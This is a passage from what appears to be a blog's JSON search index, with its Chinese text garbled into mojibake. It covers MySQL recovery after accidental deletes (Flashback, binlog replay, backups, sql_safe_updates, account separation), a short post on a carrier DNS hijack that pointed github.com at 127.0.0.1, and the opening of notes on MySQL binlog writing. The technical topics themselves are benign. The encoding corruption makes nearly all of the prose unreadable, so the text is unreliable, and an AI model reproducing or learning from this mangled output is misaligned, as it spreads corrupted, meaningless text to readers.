Delete_rows event æ”¹ä¸º Write_rows event; è€Œå¦‚æœæ˜¯ Update_rows çš„è¯ï¼Œbinlog é‡Œé¢è®°å½•äº†æ•°æ®è¡Œä¿®æ”¹å‰å’Œä¿®æ”¹åçš„å€¼ï¼Œå¯¹è°ƒè¿™ä¸¤è¡Œçš„ä½ç½®å³å¯ã€‚ å¦‚æœè¯¯æ“ä½œä¸æ˜¯ä¸€ä¸ªï¼Œè€Œæ˜¯å¤šä¸ªï¼Œä¼šæ€ä¹ˆæ ·å‘¢?æ¯”å¦‚ä¸‹é¢ä¸‰ä¸ªäº‹åŠ¡ï¼š 123(A)delete ... (B)insert ... (C)update ... ç°åœ¨è¦æŠŠæ•°æ®åº“æ¢å¤å›è¿™ä¸‰ä¸ªäº‹åŠ¡æ“ä½œä¹‹å‰çš„çŠ¶æ€ï¼Œç”¨ Flashback å·¥å…·è§£æ binlog åï¼Œå†™ å›ä¸»åº“çš„å‘½ä»¤æ˜¯ï¼š 123(reverse C)update ... (reverse B)delete ... (reverse A)insert ... ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¯¯åˆ æ•°æ®æ¶‰åŠåˆ°äº†å¤šä¸ªäº‹åŠ¡çš„è¯ï¼Œéœ€è¦å°†äº‹åŠ¡çš„é¡ºåºè°ƒè¿‡æ¥å†æ‰§è¡Œã€‚ éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œæˆ‘ä¸å»ºè®®ä½ ç›´æ¥åœ¨ä¸»åº“ä¸Šæ‰§è¡Œè¿™äº›æ“ä½œã€‚ æ¢å¤æ•°æ®æ¯”è¾ƒå®‰å…¨çš„åšæ³•ï¼Œæ˜¯æ¢å¤å‡ºä¸€ä¸ªå¤‡ä»½ï¼Œæˆ–è€…æ‰¾ä¸€ä¸ªä»åº“ä½œä¸ºä¸´æ—¶åº“ï¼Œåœ¨è¿™ä¸ªä¸´æ—¶åº“ä¸Šæ‰§è¡Œè¿™äº›æ“ä½œï¼Œç„¶åå†å°†ç¡®è®¤è¿‡çš„ä¸´æ—¶åº“çš„æ•°æ®ï¼Œæ¢å¤å›ä¸»åº“ã€‚ ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå‘¢? è¿™æ˜¯å› ä¸ºï¼Œä¸€ä¸ªåœ¨æ‰§è¡Œçº¿ä¸Šé€»è¾‘çš„ä¸»åº“ï¼Œæ•°æ®çŠ¶æ€çš„å˜æ›´å¾€å¾€æ˜¯æœ‰å…³è”çš„ã€‚å¯èƒ½ç”±äºå‘ç°æ•°æ®é—®é¢˜çš„æ—¶é—´æ™šäº†ä¸€ç‚¹å„¿ï¼Œå°±å¯¼è‡´å·²ç»åœ¨ä¹‹å‰è¯¯æ“ä½œçš„åŸºç¡€ä¸Šï¼Œä¸šåŠ¡ä»£ç é€»è¾‘åˆç»§ç»­ä¿®æ”¹äº†å…¶ä»–æ•°æ®ã€‚æ‰€ä»¥ï¼Œå¦‚æœè¿™æ—¶å€™å•ç‹¬æ¢å¤è¿™å‡ è¡Œæ•°æ®ï¼Œè€Œåˆæœªç»ç¡®è®¤çš„è¯ï¼Œå°±å¯èƒ½ä¼šå‡ºç°å¯¹æ•°æ®çš„äºŒæ¬¡ç ´åã€‚ å½“ç„¶ï¼Œæˆ‘ä»¬ä¸æ­¢è¦è¯´è¯¯åˆ æ•°æ®çš„äº‹åå¤„ç†åŠæ³•ï¼Œæ›´é‡è¦æ˜¯è¦åšåˆ°äº‹å‰é¢„é˜²ã€‚æˆ‘æœ‰ä»¥ä¸‹ä¸¤ä¸ªå»ºè®®ï¼š æŠŠ sql_safe_updates å‚æ•°è®¾ç½®ä¸º onã€‚è¿™æ ·ä¸€æ¥ï¼Œå¦‚æœæˆ‘ä»¬å¿˜è®°åœ¨ delete æˆ–è€… update è¯­å¥ä¸­å†™ where æ¡ä»¶ï¼Œæˆ–è€… where æ¡ä»¶é‡Œé¢æ²¡æœ‰åŒ…å«ç´¢å¼•å­—æ®µçš„è¯ï¼Œè¿™æ¡è¯­å¥çš„æ‰§è¡Œ å°±ä¼šæŠ¥é”™ã€‚ ä»£ç ä¸Šçº¿å‰ï¼Œå¿…é¡»ç»è¿‡ SQL å®¡è®¡ã€‚ ä½ å¯èƒ½ä¼šè¯´ï¼Œè®¾ç½®äº† sql_safe_updates=onï¼Œå¦‚æœæˆ‘çœŸçš„è¦æŠŠä¸€ä¸ªå°è¡¨çš„æ•°æ®å…¨éƒ¨åˆ æ‰ï¼Œ åº”è¯¥æ€ä¹ˆåŠå‘¢? å¦‚æœä½ ç¡®å®šè¿™ä¸ªåˆ é™¤æ“ä½œæ²¡é—®é¢˜çš„è¯ï¼Œå¯ä»¥åœ¨ delete è¯­å¥ä¸­åŠ ä¸Š where æ¡ä»¶ï¼Œæ¯”å¦‚ where id&gt;=0ã€‚ ä½†æ˜¯ï¼Œdelete å…¨è¡¨æ˜¯å¾ˆæ…¢çš„ï¼Œéœ€è¦ç”Ÿæˆå›æ»šæ—¥å¿—ã€å†™ redoã€å†™ binlogã€‚æ‰€ä»¥ï¼Œä»æ€§èƒ½è§’ åº¦è€ƒè™‘ï¼Œä½ åº”è¯¥ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨ truncate table æˆ–è€… drop table å‘½ä»¤ã€‚ ä½¿ç”¨ delete å‘½ä»¤åˆ é™¤çš„æ•°æ®ï¼Œä½ è¿˜å¯ä»¥ç”¨ Flashback æ¥æ¢å¤ã€‚è€Œä½¿ç”¨ truncate /drop table å’Œ drop database å‘½ä»¤åˆ é™¤çš„æ•°æ®ï¼Œå°±æ²¡åŠæ³•é€šè¿‡ Flashback æ¥æ¢å¤äº†ã€‚ä¸ºä»€ä¹ˆ å‘¢? è¿™æ˜¯å› ä¸ºï¼Œå³ä½¿æˆ‘ä»¬é…ç½®äº† binlog_format=rowï¼Œæ‰§è¡Œè¿™ä¸‰ä¸ªå‘½ä»¤æ—¶ï¼Œè®°å½•çš„ binlog è¿˜ æ˜¯ statement æ ¼å¼ã€‚binlog é‡Œé¢å°±åªæœ‰ä¸€ä¸ª truncate/drop è¯­å¥ï¼Œè¿™äº›ä¿¡æ¯æ˜¯æ¢å¤ä¸å‡º æ•°æ®çš„ã€‚ é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬çœŸçš„æ˜¯ä½¿ç”¨è¿™å‡ æ¡å‘½ä»¤è¯¯åˆ æ•°æ®äº†ï¼Œåˆè¯¥æ€ä¹ˆåŠå‘¢? è¯¯åˆ åº“/è¡¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦æƒ³æ¢å¤æ•°æ®ï¼Œå°±éœ€è¦ä½¿ç”¨å…¨é‡å¤‡ä»½ï¼ŒåŠ å¢é‡æ—¥å¿—çš„æ–¹å¼äº†ã€‚è¿™ä¸ªæ–¹æ¡ˆè¦æ±‚çº¿ä¸Šæœ‰å®šæœŸçš„å…¨é‡å¤‡ä»½ï¼Œå¹¶ä¸”å®æ—¶å¤‡ä»½ binlogã€‚ åœ¨è¿™ä¸¤ä¸ªæ¡ä»¶éƒ½å…·å¤‡çš„æƒ…å†µä¸‹ï¼Œå‡å¦‚æœ‰äººä¸­åˆ 12 ç‚¹è¯¯åˆ äº†ä¸€ä¸ªåº“ï¼Œæ¢å¤æ•°æ®çš„æµç¨‹å¦‚ä¸‹: å–æœ€è¿‘ä¸€æ¬¡å…¨é‡å¤‡ä»½ï¼Œå‡è®¾è¿™ä¸ªåº“æ˜¯ä¸€å¤©ä¸€å¤‡ï¼Œä¸Šæ¬¡å¤‡ä»½æ˜¯å½“å¤© 0 ç‚¹; 2. ç”¨å¤‡ä»½æ¢å¤å‡ºä¸€ä¸ªä¸´æ—¶åº“; ä»æ—¥å¿—å¤‡ä»½é‡Œé¢ï¼Œå–å‡ºå‡Œæ™¨ 0 ç‚¹ä¹‹åçš„æ—¥å¿—; æŠŠè¿™äº›æ—¥å¿—ï¼Œé™¤äº†è¯¯åˆ é™¤æ•°æ®çš„è¯­å¥å¤–ï¼Œå…¨éƒ¨åº”ç”¨åˆ°ä¸´æ—¶åº“ã€‚ è¿™ä¸ªæµç¨‹çš„ç¤ºæ„å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š å…³äºè¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘éœ€è¦å’Œä½ è¯´æ˜å¦‚ä¸‹å‡ ç‚¹: ä¸ºäº†åŠ é€Ÿæ•°æ®æ¢å¤ï¼Œå¦‚æœè¿™ä¸ªä¸´æ—¶åº“ä¸Šæœ‰å¤šä¸ªæ•°æ®åº“ï¼Œä½ å¯ä»¥åœ¨ä½¿ç”¨ mysqlbinlog å‘½ä»¤ æ—¶ï¼ŒåŠ ä¸Šä¸€ä¸ªâ€“database å‚æ•°ï¼Œç”¨æ¥æŒ‡å®šè¯¯åˆ è¡¨æ‰€åœ¨çš„åº“ã€‚è¿™æ ·ï¼Œå°±é¿å…äº†åœ¨æ¢å¤æ•°æ® æ—¶è¿˜è¦åº”ç”¨å…¶ä»–åº“æ—¥å¿—çš„æƒ…å†µã€‚ åœ¨åº”ç”¨æ—¥å¿—çš„æ—¶å€™ï¼Œéœ€è¦è·³è¿‡ 12 ç‚¹è¯¯æ“ä½œçš„é‚£ä¸ªè¯­å¥çš„ binlogï¼š å¦‚æœåŸå®ä¾‹æ²¡æœ‰ä½¿ç”¨ GTID æ¨¡å¼ï¼Œåªèƒ½åœ¨åº”ç”¨åˆ°åŒ…å« 12 ç‚¹çš„ binlog æ–‡ä»¶çš„æ—¶å€™ï¼Œå…ˆ ç”¨â€“stop-position å‚æ•°æ‰§è¡Œåˆ°è¯¯æ“ä½œä¹‹å‰çš„æ—¥å¿—ï¼Œç„¶åå†ç”¨â€“start-position ä»è¯¯æ“ä½œ ä¹‹åçš„æ—¥å¿—ç»§ç»­æ‰§è¡Œ; å¦‚æœå®ä¾‹ä½¿ç”¨äº† GTID æ¨¡å¼ï¼Œå°±æ–¹ä¾¿å¤šäº†ã€‚å‡è®¾è¯¯æ“ä½œå‘½ä»¤çš„ GTID æ˜¯ gtid1ï¼Œé‚£ä¹ˆåª éœ€è¦æ‰§è¡Œ set gtid_next=gtid1;begin;commit; å…ˆæŠŠè¿™ä¸ª GTID åŠ åˆ°ä¸´æ—¶å®ä¾‹çš„ GTID é›†åˆï¼Œä¹‹åæŒ‰é¡ºåºæ‰§è¡Œ binlog çš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨è·³è¿‡è¯¯æ“ä½œçš„è¯­å¥ã€‚ ä¸è¿‡ï¼Œå³ä½¿è¿™æ ·ï¼Œä½¿ç”¨ mysqlbinlog æ–¹æ³•æ¢å¤æ•°æ®è¿˜æ˜¯ä¸å¤Ÿå¿«ï¼Œä¸»è¦åŸå› æœ‰ä¸¤ä¸ªï¼š å¦‚æœæ˜¯è¯¯åˆ è¡¨ï¼Œæœ€å¥½å°±æ˜¯åªæ¢å¤å‡ºè¿™å¼ è¡¨ï¼Œä¹Ÿå°±æ˜¯åªé‡æ”¾è¿™å¼ è¡¨çš„æ“ä½œï¼Œä½†æ˜¯ mysqlbinlog å·¥å…·å¹¶ä¸èƒ½æŒ‡å®šåªè§£æä¸€ä¸ªè¡¨çš„æ—¥å¿—; ç”¨ mysqlbinlog è§£æå‡ºæ—¥å¿—åº”ç”¨ï¼Œåº”ç”¨æ—¥å¿—çš„è¿‡ç¨‹å°±åªèƒ½æ˜¯å•çº¿ç¨‹ã€‚æˆ‘ä»¬åœ¨ç¬¬ 26 ç¯‡æ–‡ ç« ä¸­ä»‹ç»çš„é‚£äº›å¹¶è¡Œå¤åˆ¶çš„æ–¹æ³•ï¼Œåœ¨è¿™é‡Œéƒ½ç”¨ä¸ä¸Šã€‚ ä¸€ç§åŠ é€Ÿçš„æ–¹æ³•æ˜¯ï¼Œåœ¨ç”¨å¤‡ä»½æ¢å¤å‡ºä¸´æ—¶å®ä¾‹ä¹‹åï¼Œå°†è¿™ä¸ªä¸´æ—¶å®ä¾‹è®¾ç½®æˆçº¿ä¸Šå¤‡åº“çš„ä»åº“ï¼Œè¿™æ ·ï¼š åœ¨ start slave ä¹‹å‰ï¼Œå…ˆé€šè¿‡æ‰§è¡Œ change replication filter replicate_do_table = (tbl_name) å‘½ä»¤ï¼Œå°±å¯ä»¥è®©ä¸´æ—¶åº“åª åŒæ­¥è¯¯æ“ä½œçš„è¡¨; è¿™æ ·åšä¹Ÿå¯ä»¥ç”¨ä¸Šå¹¶è¡Œå¤åˆ¶æŠ€æœ¯ï¼Œæ¥åŠ é€Ÿæ•´ä¸ªæ•°æ®æ¢å¤è¿‡ç¨‹ã€‚ è¿™ä¸ªè¿‡ç¨‹çš„ç¤ºæ„å›¾å¦‚ä¸‹æ‰€ç¤ºã€‚ å¯ä»¥çœ‹åˆ°ï¼Œå›¾ä¸­ binlog å¤‡ä»½ç³»ç»Ÿåˆ°çº¿ä¸Šå¤‡åº“æœ‰ä¸€æ¡è™šçº¿ï¼Œæ˜¯æŒ‡å¦‚æœç”±äºæ—¶é—´å¤ªä¹…ï¼Œå¤‡åº“ä¸Š å·²ç»åˆ é™¤äº†ä¸´æ—¶å®ä¾‹éœ€è¦çš„ binlog çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä» binlog å¤‡ä»½ç³»ç»Ÿä¸­æ‰¾åˆ°éœ€è¦çš„ binlogï¼Œå†æ”¾å›å¤‡åº“ä¸­ã€‚ å‡è®¾ï¼Œæˆ‘ä»¬å‘ç°å½“å‰ä¸´æ—¶å®ä¾‹éœ€è¦çš„ binlog æ˜¯ä» master.000005 å¼€å§‹çš„ï¼Œä½†æ˜¯åœ¨å¤‡åº“ä¸Š æ‰§è¡Œ show binlogs æ˜¾ç¤ºçš„æœ€å°çš„ binlog æ–‡ä»¶æ˜¯ master.000007ï¼Œæ„å‘³ç€å°‘äº†ä¸¤ä¸ª binlog æ–‡ä»¶ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬å°±éœ€è¦å» binlog å¤‡ä»½ç³»ç»Ÿä¸­æ‰¾åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚æŠŠä¹‹å‰åˆ æ‰çš„ binlog æ”¾å›å¤‡åº“çš„æ“ä½œæ­¥éª¤ï¼Œæ˜¯è¿™æ ·çš„ï¼š ä»å¤‡ä»½ç³»ç»Ÿä¸‹è½½ master.000005 å’Œ master.000006 è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ”¾åˆ°å¤‡åº“çš„æ—¥å¿—ç›®å½• ä¸‹; æ‰“å¼€æ—¥å¿—ç›®å½•ä¸‹çš„ master.index æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¼€å¤´åŠ å…¥ä¸¤è¡Œï¼Œå†…å®¹åˆ†åˆ«æ˜¯ â€œ./master.000005â€å’Œâ€œ./master.000006â€; é‡å¯å¤‡åº“ï¼Œç›®çš„æ˜¯è¦è®©å¤‡åº“é‡æ–°è¯†åˆ«è¿™ä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶; ç°åœ¨è¿™ä¸ªå¤‡åº“ä¸Šå°±æœ‰äº†ä¸´æ—¶åº“éœ€è¦çš„æ‰€æœ‰ binlog äº†ï¼Œå»ºç«‹ä¸»å¤‡å…³ç³»ï¼Œå°±å¯ä»¥æ­£å¸¸åŒæ­¥äº†ã€‚ ä¸è®ºæ˜¯æŠŠ mysqlbinlog å·¥å…·è§£æå‡ºçš„ binlog æ–‡ä»¶åº”ç”¨åˆ°ä¸´æ—¶åº“ï¼Œè¿˜æ˜¯æŠŠä¸´æ—¶åº“æ¥åˆ°å¤‡åº“ ä¸Šï¼Œè¿™ä¸¤ä¸ªæ–¹æ¡ˆçš„å…±åŒç‚¹æ˜¯:è¯¯åˆ åº“æˆ–è€…è¡¨åï¼Œæ¢å¤æ•°æ®çš„æ€è·¯ä¸»è¦å°±æ˜¯é€šè¿‡å¤‡ä»½ï¼Œå†åŠ ä¸Š åº”ç”¨ binlog çš„æ–¹å¼ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸¤ä¸ªæ–¹æ¡ˆéƒ½è¦æ±‚å¤‡ä»½ç³»ç»Ÿå®šæœŸå¤‡ä»½å…¨é‡æ—¥å¿—ï¼Œè€Œä¸”éœ€è¦ç¡®ä¿ binlog åœ¨è¢«ä»æœ¬ åœ°åˆ é™¤ä¹‹å‰å·²ç»åšäº†å¤‡ä»½ã€‚ ä½†æ˜¯ï¼Œä¸€ä¸ªç³»ç»Ÿä¸å¯èƒ½å¤‡ä»½æ— é™çš„æ—¥å¿—ï¼Œä½ è¿˜éœ€è¦æ ¹æ®æˆæœ¬å’Œç£ç›˜ç©ºé—´èµ„æºï¼Œè®¾å®šä¸€ä¸ªæ—¥å¿— ä¿ç•™çš„å¤©æ•°ã€‚å¦‚æœä½ çš„ DBA å›¢é˜Ÿå‘Šè¯‰ä½ ï¼Œå¯ä»¥ä¿è¯æŠŠæŸä¸ªå®ä¾‹æ¢å¤åˆ°åŠä¸ªæœˆå†…çš„ä»»æ„æ—¶é—´ ç‚¹ï¼Œè¿™å°±è¡¨ç¤ºå¤‡ä»½ç³»ç»Ÿä¿ç•™çš„æ—¥å¿—æ—¶é—´å°±è‡³å°‘æ˜¯åŠä¸ªæœˆã€‚ å¦å¤–ï¼Œæˆ‘å»ºè®®ä½ ä¸è®ºä½¿ç”¨ä¸Šè¿°å“ªç§æ–¹å¼ï¼Œéƒ½è¦æŠŠè¿™ä¸ªæ•°æ®æ¢å¤åŠŸèƒ½åšæˆè‡ªåŠ¨åŒ–å·¥å…·ï¼Œå¹¶ä¸”ç»å¸¸æ‹¿å‡ºæ¥æ¼”ç»ƒã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢? è¿™è¿™é‡Œçš„åŸå› ï¼Œä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªæ–¹é¢ï¼š è™½ç„¶â€œå‘ç”Ÿè¿™ç§äº‹ï¼Œå¤§å®¶éƒ½ä¸æƒ³çš„â€ï¼Œä½†æ˜¯ä¸‡ä¸€å‡ºç°äº†è¯¯åˆ äº‹ä»¶ï¼Œèƒ½å¤Ÿå¿«é€Ÿæ¢å¤æ•°æ®ï¼Œ å°†æŸå¤±é™åˆ°æœ€å°ï¼Œä¹Ÿåº”è¯¥ä¸ç”¨è·‘è·¯äº†ã€‚ è€Œå¦‚æœä¸´æ—¶å†æ‰‹å¿™è„šä¹±åœ°æ‰‹åŠ¨æ“ä½œï¼Œæœ€ååˆè¯¯æ“ä½œäº†ï¼Œå¯¹ä¸šåŠ¡é€ æˆäº†äºŒæ¬¡ä¼¤å®³ï¼Œé‚£å°±è¯´ ä¸è¿‡å»äº†ã€‚ é¢„é˜²è¯¯åˆ åº“/è¡¨çš„æ–¹æ³•è™½ç„¶å¸¸åœ¨æ²³è¾¹èµ°ï¼Œå¾ˆéš¾ä¸æ¹¿é‹ï¼Œä½†ç»ˆç©¶è¿˜æ˜¯å¯ä»¥æ‰¾åˆ°ä¸€äº›æ–¹æ³•æ¥é¿å…çš„ã€‚æ‰€ä»¥è¿™é‡Œï¼Œæˆ‘ä¹Ÿä¼šç»™ä½ ä¸€äº›å‡å°‘è¯¯åˆ æ“ä½œé£é™©çš„å»ºè®®ã€‚ ç¬¬ä¸€æ¡å»ºè®®æ˜¯ï¼Œè´¦å·åˆ†ç¦»ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ï¼Œé¿å…å†™é”™å‘½ä»¤ã€‚æ¯”å¦‚: æˆ‘ä»¬åªç»™ä¸šåŠ¡å¼€å‘åŒå­¦ DML æƒé™ï¼Œè€Œä¸ç»™ truncate/drop æƒé™ã€‚è€Œå¦‚æœä¸šåŠ¡å¼€å‘äººå‘˜ æœ‰ DDL éœ€æ±‚çš„è¯ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¼€å‘ç®¡ç†ç³»ç»Ÿå¾—åˆ°æ”¯æŒã€‚ å³ä½¿æ˜¯ DBA å›¢é˜Ÿæˆå‘˜ï¼Œæ—¥å¸¸ä¹Ÿéƒ½è§„å®šåªä½¿ç”¨åªè¯»è´¦å·ï¼Œå¿…è¦çš„æ—¶å€™æ‰ä½¿ç”¨æœ‰æ›´æ–°æƒé™çš„ è´¦å·ã€‚ ç¬¬äºŒæ¡å»ºè®®æ˜¯ï¼Œåˆ¶å®šæ“ä½œè§„èŒƒã€‚è¿™æ ·åšçš„ç›®çš„ï¼Œæ˜¯é¿å…å†™é”™è¦åˆ é™¤çš„è¡¨åã€‚æ¯”å¦‚ï¼š åœ¨åˆ é™¤æ•°æ®è¡¨ä¹‹å‰ï¼Œå¿…é¡»å…ˆå¯¹è¡¨åšæ”¹åæ“ä½œã€‚ç„¶åï¼Œè§‚å¯Ÿä¸€æ®µæ—¶é—´ï¼Œç¡®ä¿å¯¹ä¸šåŠ¡æ— å½±å“ä»¥åå†åˆ é™¤è¿™å¼ è¡¨ã€‚ æ”¹è¡¨åçš„æ—¶å€™ï¼Œè¦æ±‚ç»™è¡¨ååŠ å›ºå®šçš„åç¼€(æ¯”å¦‚åŠ  _to_be_deleted)ï¼Œç„¶ååˆ é™¤è¡¨çš„åŠ¨ä½œ å¿…é¡»é€šè¿‡ç®¡ç†ç³»ç»Ÿæ‰§è¡Œã€‚å¹¶ä¸”ï¼Œç®¡ç†ç³»åˆ é™¤è¡¨çš„æ—¶å€™ï¼Œåªèƒ½åˆ é™¤å›ºå®šåç¼€çš„è¡¨ã€‚ æ€»ç»“ äº†è§£äº†ä¸åŒç±»å‹çš„è¯¯åˆ æ•°æ®ä¹‹åçš„è§£å†³æ–¹æ¡ˆã€‚ é¢„é˜²è¿œæ¯”å¤„ç†çš„æ„ä¹‰æ¥å¾—å¤§ï¼Œå¯ä»¥é€šè¿‡ SQL å®¡è®¡ã€è´¦æˆ·æƒé™æ§åˆ¶ã€å®šæœŸæ£€æŸ¥å¤‡ä»½ç­‰æ–¹å¼é¢„é˜²ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"è®°å½•ä¸€æ¬¡è¿è¥å•†åŠ«æŒ DNS","slug":"log-a-carrier-hijacking-dns","date":"2022-08-20T02:15:05.000Z","updated":"2023-02-18T03:28:33.604Z","comments":true,"path":"log-a-carrier-hijacking-dns/","link":"","permalink":"https://www.0x2beace.com/log-a-carrier-hijacking-dns/","excerpt":"æœ€è¿‘æ‰‹æœºä¸Šè®¿é—® github.comï¼Œç›´æ¥å°±æ˜¯æ‰“ä¸å¼€äº†ï¼Œèµ·åˆå¹¶æ²¡æœ‰å¤šæƒ³ï¼Œå¯èƒ½åªæ˜¯ç½‘ç»œè¾ƒå·®å§ã€‚","text":"æœ€è¿‘æ‰‹æœºä¸Šè®¿é—® github.comï¼Œç›´æ¥å°±æ˜¯æ‰“ä¸å¼€äº†ï¼Œèµ·åˆå¹¶æ²¡æœ‰å¤šæƒ³ï¼Œå¯èƒ½åªæ˜¯ç½‘ç»œè¾ƒå·®å§ã€‚ çŸ¥é“æœ€è¿‘å†™åšå®¢æ—¶ï¼Œéœ€è¦æŠŠå›¾ç‰‡ä¸Šä¼ åˆ°å›¾åºŠä¸Šï¼Œä½†æ˜¯å¤±è´¥äº†ã€‚ é”™è¯¯æ—¥å¿—å¦‚ä¸‹ï¼š 1234567891011RequestError: Error: connect ECONNREFUSED 127.0.0.1:443 at new RequestError (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request-promise-core&#x2F;lib&#x2F;errors.js:14:15) at Request.plumbing.callback (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request-promise-core&#x2F;lib&#x2F;plumbing.js:87:29) at Request.RP$callback [as _callback] (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request-promise-core&#x2F;lib&#x2F;plumbing.js:46:31) at self.callback (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request&#x2F;request.js:185:22) at Request.emit (events.js:200:13) at Request.onRequestError (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request&#x2F;request.js:877:8) at ClientRequest.emit (events.js:200:13) at TLSSocket.socketErrorListener (_http_client.js:402:9) at TLSSocket.emit (events.js:200:13) at emitErrorNT (internal&#x2F;streams&#x2F;destroy.js:91:8) çœ‹åˆ°è¿™ä¸ªæ—¥å¿—ä¹‹åï¼Œæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯ï¼Œæ€ä¹ˆè¯·æ±‚çš„æ˜¯ 127.0.0.1 å‘¢ï¼Ÿ ç„¶ååœ¨æœ¬åœ° ping äº†ä¸€ä¸‹ github.comï¼š å’¦ï¼Œè¿”å›çš„åœ°å€ç«Ÿç„¶æ˜¯ 127.0.0.1ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯è®¾ç½®äº†æœ¬åœ°åŸŸåçš„å…³ç³»ï¼Œç»“æœçœ‹äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰github.com è¿™ä¸ªåŸŸåã€‚ äºæ˜¯é€šè¿‡ç«™é•¿å·¥å…·çš„ DNS æŸ¥è¯¢åŠŸèƒ½è¿›è¡ŒæŸ¥è¯¢ï¼Œç»“æœå¦‚ä¸‹ï¼š å¹¿ä¸œç”µä¿¡ï¼Œç«Ÿç„¶æŠŠ DNS ç»™åŠ«æŒäº†ï¼Œè¿™ä¸ª 127.0.0.1 æ˜¾ç„¶æ˜¯è¿è¥å•†è§£æçš„ã€‚ äºæ˜¯å°†æ­£ç¡®çš„åœ°å€ï¼Œé…ç½®åœ¨ hosts ä¹‹åï¼Œå†æ¬¡é€šè¿‡å›¾åºŠè¿›è¡Œä¸Šä¼ ï¼Œå°±å¯ä»¥äº†ã€‚","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}]},{"title":"23 MySQLæ˜¯æ€ä¹ˆä¿è¯æ•°æ®ä¸ä¸¢çš„","slug":"how-does-mysql-ensure-that-data-is-not-lost","date":"2022-08-19T01:18:24.000Z","updated":"2023-02-18T03:28:33.599Z","comments":true,"path":"how-does-mysql-ensure-that-data-is-not-lost/","link":"","permalink":"https://www.0x2beace.com/how-does-mysql-ensure-that-data-is-not-lost/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ binlog çš„å†™å…¥æœºåˆ¶ äº†è§£ redo log çš„å†™å…¥æœºåˆ¶","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ binlog çš„å†™å…¥æœºåˆ¶ äº†è§£ redo log çš„å†™å…¥æœºåˆ¶ binlog çš„å†™å…¥æœºåˆ¶å…¶å®ï¼Œbinlog çš„å†™å…¥é€»è¾‘æ¯”è¾ƒç®€å•ï¼šäº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå…ˆæŠŠæ—¥å¿—å†™åˆ° binlog cacheï¼Œäº‹åŠ¡æäº¤çš„æ—¶å€™ï¼Œå†æŠŠ binlog cache å†™åˆ° binlog æ–‡ä»¶ä¸­ã€‚ ä¸€ä¸ªäº‹åŠ¡çš„ binlog æ˜¯ä¸èƒ½è¢«æ‹†å¼€çš„ï¼Œå› æ­¤ä¸è®ºè¿™ä¸ªäº‹åŠ¡å¤šå¤§ï¼Œä¹Ÿè¦ç¡®ä¿ä¸€æ¬¡æ€§å†™å…¥ã€‚è¿™å°±æ¶‰åŠåˆ°äº† binlog cache çš„ä¿å­˜é—®é¢˜ã€‚ ç³»ç»Ÿç»™ binlog cache åˆ†é…äº†ä¸€ç‰‡å†…å­˜ï¼Œæ¯ä¸ªçº¿ç¨‹ä¸€ä¸ªï¼Œå‚æ•° binlog_cache_size ç”¨äºæ§åˆ¶å•ä¸ªçº¿ç¨‹å†… binlog cache æ‰€å å†…å­˜çš„å¤§å°ã€‚å¦‚æœè¶…è¿‡äº†è¿™ä¸ªå‚æ•°è§„å®šçš„å¤§å°ï¼Œå°±è¦æš‚å­˜åˆ°ç£ç›˜ã€‚ 